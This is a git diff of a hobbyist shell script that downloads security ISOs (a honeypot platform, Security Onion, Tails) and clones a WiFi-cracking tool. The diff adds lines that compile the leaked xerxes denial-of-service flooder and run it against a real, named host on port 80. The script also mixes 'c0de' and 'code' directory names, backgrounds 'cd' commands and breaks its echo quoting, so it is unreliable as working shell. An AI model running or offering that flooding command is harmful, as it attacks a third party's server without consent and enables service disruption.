@@ -1,7 +1,5 @@
 #!/bin/sh
 #bish I been bash'n away in the Bourne Again Shell!
-# I download a lot of ISOs. Automating my Automat.
-# Thom Hastings (c) 2019 Scratching an Itch AGPL
 # mac? brew install wget
 # deb? apt install wget
 # else? fuck you. *nix
@@ -9,9 +7,10 @@ wget -c https://github.com/dtag-dev-sec/tpotce/releases/download/18.11/tpot.iso 
 #tpot.iso	https://github.com/dtag-dev-sec/tpotce #bitch
 git clone https://github.com/dtag-dev-sec/tpotce tpot-multi-honeypot
 firefox https://n0where.net/multi-honeypot-platform & #biotch
+wget -c https://lab26.net/static/files/Lab26.zip -O Lab26_Cyber_Firing_Range.zip &
 echo "Opening GitHub in FireFox:"
 firefox https://github.com/dtag-dev-sec/tpotce &
-echo "renaming tpot.iso to tpot-multi-honeypot.iso ..."
+echo "renaming "tpot.iso" to "tpot-multi-honeypot.iso ..."
 mv tpot.iso tpot-multi-honeypot.iso
 # T-Pot is a multi-honeypot (US:DoD:DMZ_ONLY.)(T-MobileSponsored)
 #################################################################
@@ -27,24 +26,24 @@ echo "Yet Another Shameless Plug for Greenbone:"
 firefox https://www.greenbone.net/en/community-edition/ &
 #######################################################################################
 #securityonion*.iso							securityonion.net
-wget -c https://github.com/Security-Onion-Solutions/security-onion/releases/download/v16.04.5.5_20181212/securityonion-16.04.5.5.iso
+wget -c https://github.com/Security-Onion-Solutions/security-onion/releases/download/v16.04.5.5_20181212/securityonion-16.04.5.5.iso &
 # Security Onion is a virtual firewall "appliance" (contains Suricata, Sagan, and Snort.)
 # N.B: Should also be deployed on either end of the DMZ, for proper Zone Segmentation
 #####################################################################################
-mkdir c0de
-cd code
-git clone https://github.com/derv82/wifite2
-cd wifite2
-sudo python Wifite2.py
+mkdir c0de &
+cd code &
+git clone https://github.com/derv82/wifite2 &
+#cd wifite2
+#sudo python Wifite2.py
 # Wifite.py is the best way to Crack WiFi short of the KRACK attack: krackattacks.com
 #####################################################################################
 # THE'FUN'STUFF # DANGER ZONE! # GONNA TAKE A RIDE INTO THE DANGER ZONE! DANGER ZONE!
 # "Are we still doing phrasing? Because if we stopped doing phrasing and nobody told
 #####################################################################################
-mkdir hax
-cd hax
+#mkdir hax
+#cd hax
 #kali-*.iso								kali.org
-wget -c ###TODO://PLACEHOLDER###
+#wget -c ###TODO://PLACEHOLDER###
 firefox https://github.com/Security-Onion-Solutions/security-onion/blob/master/Verify_ISO.md#160455-iso-image-built-on-20181212 &
 # Previously BackTrack, a distro based on Auditor, Whax... & WifiSlax/Knoppix...
 #             🙏MUTS🙇                    remote-exploit.org;backtrack-linux.org
@@ -52,11 +51,14 @@ firefox https://github.com/Security-Onion-Solutions/security-onion/blob/master/V
 #############################################################################
 #tails-*.iso								tails.boum.org
 ###todo://placeholder###
-wget -c https://tails.as1101.net/tails/stable/tails-amd64-3.11/tails-amd64-3.11.iso
+wget -c https://tails.as1101.net/tails/stable/tails-amd64-3.11/tails-amd64-3.11.iso &
 firefox https://tails.boum.org/install/download/index.en.html &
 # Privacy & Anonymity focused distro, runs Tor, wipes RAM after shutdown, etc.
 ##############################################################################
-xerxes.c									[pastebin]
+#xerxes.c									[pastebin]
+# apt install build-essential
+gcc -o xerxes xerxes.c
+./xerxes tanto.li 80
 # written by @th3j35t3r (Tom Ryan) & leaked by @AnonymouSabu (xavsec.blogspot.com)
 ##################################################################################
 # since we're naming names Jacob Applebaum did the work for Cold Boot & Evil Maids
